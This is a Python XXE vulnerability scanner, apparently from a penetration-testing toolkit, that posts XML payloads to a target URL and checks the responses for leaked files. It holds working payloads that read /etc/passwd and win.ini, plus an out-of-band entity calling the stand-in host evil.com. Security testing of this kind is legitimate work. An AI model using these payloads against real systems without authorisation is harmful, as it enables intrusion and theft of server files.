"""XXE 检测工具"""

from typing import Optional

from ..client import HttpClient
from ..utils import normalize_url


async def bb_xxe(
    url: str,
    proxy: Optional[str] = None,
    cookie: Optional[str] = None,
    timeout: int = 15,
    content_type: str = "application/xml",
) -> str:
    """
    XXE 检测 — XML 外部实体注入检测

    检测方式:
    1. 经典 XXE — 读取 /etc/passwd 或 win.ini
    2. Blind OOB XXE — 外部 DTD 加载
    3. XXE 通过文件上传 / API

    Args:
        url: XML 解析接口 URL（POST）
        proxy: 代理地址（可选）
        cookie: Cookie（可选）
        timeout: 超时秒数（默认 15）
        content_type: Content-Type（默认 application/xml）

    Returns:
        XXE 检测结果
    """
    url = normalize_url(url)
    results = []
    results.append(f"[*] XXE 检测目标: {url}")
    results.append("")

    client = HttpClient(timeout=timeout, proxy=proxy, cookie=cookie)

    # XXE Payload 列表
    xxe_payloads = [
        {
            "name": "Classic (etc/passwd)",
            "data": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        },
        {
            "name": "Classic (win.ini)",
            "data": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>""",
        },
        {
            "name": "PHP Base64 filter",
            "data": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>""",
        },
        {
            "name": "Blind HTTP OOB",
            "data": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/xxe_test">
]>
<root>&xxe;</root>""",
        },
        {
            "name": "XInclude",
            "data": """<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>""",
        },
        {
            "name": "Parameter Entity",
            "data": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>""",
        },
        {
            "name": "SVG XXE",
            "data": """<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>""",
        },
    ]

    findings = []
    for entry in xxe_payloads:
        try:
            resp = await client.post(
                url,
                data=entry["data"],
                headers={"Content-Type": content_type},
            )
            body = resp.text
            status = resp.status_code

            # 检测 XXE 成功标志
            indicators = []
            if "root:" in body and ":" in body.split("\n")[0] if "\n" in body else False:
                indicators.append("文件读取成功 (/etc/passwd)")
            if "[fonts]" in body or "for 16-bit" in body:
                indicators.append("Windows 文件读取 (win.ini)")
            if "root:" in body and "bin:" in body:
                indicators.append("UNIX 密码文件读取")
            if body and "PD9" in body and "BP" in body:
                indicators.append("Base64 编码文件读取")
            if status == 500 and ("exception" in body.lower() or "error" in body.lower()):
                indicators.append("服务器错误 — 可能解析了 XML")
            if len(body) > 100:
                indicators.append(f"响应大小: {len(body)} bytes")

            if indicators:
                findings.append({
                    "name": entry["name"],
                    "status": status,
                    "indicators": indicators,
                })
        except Exception as e:
            findings.append({
                "name": entry["name"],
                "status": 0,
                "indicators": [f"请求异常: {str(e)[:80]}"],
            })

    if findings:
        results.append("[!] XXE 检测结果:")
        results.append("")
        for f in findings:
            results.append(f"  [{f['status']}] {f['name']}")
            for ind in f["indicators"]:
                results.append(f"    → {ind}")
            results.append("")
    else:
        results.append("[-] 未检测到 XXE 漏洞")

    results.append("")
    results.append("[*] 手动验证建议:")
    results.append("  🔗 使用 OOB (Out-of-Band) 方式验证盲 XXE:")
    results.append("    将 evil.com 替换为你的 Burp Collaborator / interactsh 域名")
    results.append("  📁 尝试不同协议: file://, http://, ftp://, php://, expect://")
    results.append("  🔄 尝试 Error-based XXE: 将实体注入到报错信息中")

    return "\n".join(results)
